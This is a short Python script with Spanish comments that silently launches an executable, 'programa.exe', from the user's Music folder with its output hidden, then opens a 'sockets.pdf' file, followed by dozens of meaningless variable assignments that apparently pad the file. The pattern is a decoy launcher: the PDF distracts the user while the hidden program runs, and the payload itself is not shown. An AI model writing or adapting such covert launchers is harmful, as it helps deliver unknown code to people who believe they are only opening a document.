import os
import subprocess

def main():
    # Obtiene la ruta del directorio Musica o Music en Windows
    musica = os.path.join(os.path.expanduser("~"), "Music")

    # Construye las rutas de los archivos
    archivou = os.path.join(musica, "sockets.pdf")
    archivod= os.path.join(musica, "programa.exe")

    # Ejecuta el archivo ejecutable
    subprocess.Popen([archivod], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Abre el archivo PDF
    if os.name == "nt":  
        os.startfile(archivou)


if __name__ == "__main__":
    main()
    
variable10 = (1, 2, 3)
variable11 = "Python"
variable12 = 42
variable13 = [4, 5, 6]
variable14 = 2.71828
variable15 = "Hola, mundo!"
variable16 = ["a", "b", "c"]
variable17 = {"nombre": "Juan", "edad": 25}
variable18 = 7
variable19 = 3.14159
variable20 = [7, 8, 9]
variable21 = True
variable22 = "Adiós"
variable23 = None
variable24 = 9.8
variable25 = False
variable26 = (4, 5, 6)
variable27 = "Programación"
variable28 = 17
variable29 = [10, 20, 30]
variable30 = 2.5
variable31 = "OpenAI"
variable32 = {"ciudad": "Paris", "país": "Francia"}
variable33 = 12
variable34 = 2.22
variable35 = [11, 22, 33]
variable36 = False
variable37 = "Bienvenidos"
variable38 = None
variable39 = 6.7
variable40 = (7, 8, 9)
variable41 = "Inteligencia Artificial"
variable42 = 21
variable43 = [40, 50, 60]
variable44 = 3.1415
variable45 = "Hola a todos"
variable46 = ["x", "y", "z"]
variable47 = {"color": "rojo", "forma": "círculo"}
variable48 = 8
variable49 = 1.618
variable50 = [100, 200, 300]
